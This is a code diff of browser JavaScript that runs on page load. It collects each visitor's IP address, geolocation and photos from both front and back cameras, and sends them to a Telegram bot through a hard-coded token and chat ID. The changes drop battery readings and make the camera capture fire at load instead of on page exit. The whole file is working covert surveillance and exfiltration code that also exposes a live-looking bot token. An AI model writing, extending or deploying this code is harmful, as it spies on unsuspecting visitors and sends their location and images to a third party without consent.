@@ -9,7 +9,6 @@
         const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
         const chatId = "1557685494";
         const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const videoUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
         const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
         const startTime = Date.now();const visitorInfo = {
         IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
@@ -26,17 +25,6 @@
         VisitStartTime: new Date(startTime).toLocaleString()
     };
 
-    if (navigator.getBattery) {
-        try {
-            const battery = await navigator.getBattery();
-            visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
-            visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
-        } catch (error) {
-            visitorInfo.BatteryPercentage = "Unavailable";
-            visitorInfo.ChargingStatus = "Unavailable";
-        }
-    }
-
     try {
         const geo = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
@@ -48,43 +36,44 @@
         visitorInfo.Location = "Unavailable";
     }
 
-    function sendMessage(text) {
-        fetch(messageUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text })
-        }).catch(console.error);
-    }
-
-    function takePhoto() {
-        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+    async function takePhoto(facingMode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
             const video = document.createElement('video');
             video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob((blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'user_photo.jpg');
-                    fetch(photoUrl, { method: 'POST', body: formData }).catch(console.error);
-                    stream.getTracks().forEach(track => track.stop());
-                });
-            }, 3000);
-        }).catch(console.error);
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `user_photo_${facingMode}.jpg`);
+                fetch(photoUrl, { method: 'POST', body: formData }).catch(console.error);
+                stream.getTracks().forEach(track => track.stop());
+            });
+        } catch (error) {
+            console.error('Error capturing photo:', error);
+        }
     }
 
-    window.addEventListener('beforeunload', takePhoto);
+    // Capture both front and back photos
+    takePhoto('user');  // Front camera
+    takePhoto('environment');  // Back camera
 
     let message = "NEW VISITOR INFORMATION\n";
     for (let key in visitorInfo) {
         message += `${key}: ${visitorInfo[key]}\n`;
     }
-    sendMessage(message);
+    fetch(messageUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    }).catch(console.error);
 }
 
 window.onload = sendVisitorInfo;
